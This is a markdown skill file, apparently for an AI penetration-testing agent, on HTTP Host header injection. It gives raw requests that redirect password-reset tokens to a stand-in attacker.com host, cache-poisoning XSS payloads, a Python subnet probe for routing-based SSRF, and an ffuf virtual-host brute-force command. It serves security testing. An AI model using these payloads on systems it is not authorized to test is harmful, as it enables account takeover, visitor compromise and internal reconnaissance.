---
name: host_header_injection
description: HTTP Host header injection - password reset poisoning, cache poisoning, routing-based SSRF, X-Forwarded-Host bypass
---

# HTTP Host Header Injection

The `Host` header controls how the server routes requests. When its value is trusted and used in security-sensitive operations (password reset links, redirects, cache keys, internal routing), an attacker-controlled `Host` header enables: poisoned password-reset links, cache poisoning, access to internal virtual hosts, and SSRF via routing-based attacks.

## Attack Surface

- Password reset flows that embed `Host` value in reset URL
- Email generation using the request host for link construction
- Reverse proxies that route to backends by Host value
- Web cache systems that may or may not include Host in cache key
- Middleware that reads `X-Forwarded-Host` / `X-Host` without validation
- Internal virtual hosts inaccessible from the internet

## Basic Injection

```
GET / HTTP/1.1
Host: attacker.com

# Variations to bypass Host header validation
GET / HTTP/1.1
Host: legitimate.com:attacker.com
Host: legitimate.com.attacker.com
Host: attacker.com#legitimate.com

# Inject non-standard headers that override Host
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
X-Forwarded-Server: attacker.com
X-Original-URL: //attacker.com/
X-Rewrite-URL: //attacker.com/
```

## Password Reset Poisoning

```
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

If the app uses `$_SERVER['HTTP_HOST']` or `request.host` to build the reset link:
- Victim receives email: `Click https://attacker.com/reset?token=ABC123`
- Attacker intercepts the token via server access logs / redirect

Test by:
1. Submit password reset with Host overridden to Burp Collaborator domain
2. Check if collaborator receives HTTP request containing reset token
3. Confirm: report shows token in path/query of received request

### Using Dangling Markup for Email Exfil

```
POST /forgot-password HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: attacker.com
```

Even if main Host is validated, many frameworks use `X-Forwarded-Host` preferentially.

## Routing-Based SSRF

When a load balancer routes requests by Host header to internal services:

```
GET / HTTP/1.1
Host: 192.168.0.1

GET / HTTP/1.1
Host: internal-service.local

# Access internal admin panel
GET /admin HTTP/1.1
Host: intranet.corporate.internal
```

Probe internal subnet:
```python
import requests

for i in range(1, 255):
    host = f"192.168.0.{i}"
    r = requests.get("https://example.com/", 
                     headers={"Host": host}, 
                     timeout=3, verify=False)
    if r.status_code != 404 and "nginx" not in r.text:
        print(f"Interesting: {host} → {r.status_code}")
```

## Cache Poisoning via Host

```
GET / HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# If cached, subsequent visitors receive XSS payload
# Verify with X-Cache: HIT header in second response
```

```
# Unkeyed header probe — send twice with same cache-buster
GET /?cb=1234 HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: "><script>alert(document.domain)</script>

# Second request (should hit cache)
GET /?cb=1234 HTTP/1.1
Host: legitimate.com
```

## Duplicate / Ambiguous Host

```
# Some parsers take the first; others take the last
GET / HTTP/1.1
Host: legitimate.com
Host: attacker.com

# Absolute-URI request (HTTP/1.1 spec allows both)
GET https://legitimate.com/ HTTP/1.1
Host: attacker.com
# Front-end uses absolute URI; back-end trusts Host header
```

## Internal Virtual Host Brute Force

```bash
# Enumerate hidden vhosts that resolve on the server
ffuf -u https://TARGET_IP/ -H "Host: FUZZ.target.com" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fc 400,404 -fs BASELINE_SIZE
```

## Spring Boot / Ruby on Rails Specific

```
# Rails: host allowlist bypass
GET / HTTP/1.1
Host: allowed-host.com.attacker.com

# Spring: if config.whitelisted_hosts not set
# Any host header is trusted by default
```

## Validation Approach

1. Manipulate Host header → observe if value appears in response (Location headers, link hrefs, email links)
2. Password reset test: Host to Burp Collaborator → check callback
3. Cache poisoning: inject XSS in X-Forwarded-Host → second request shows reflected payload
4. For each success: capture proxy request IDs (injected request + evidence response)
5. Confirm server-side processing, not just client-side reflection

## Tools

- Burp Suite — manually manipulate Host header in Repeater
- `send_request` — target custom Host header values
- `ffuf` — virtual host discovery
- Collaborator / interactsh — OOB detection
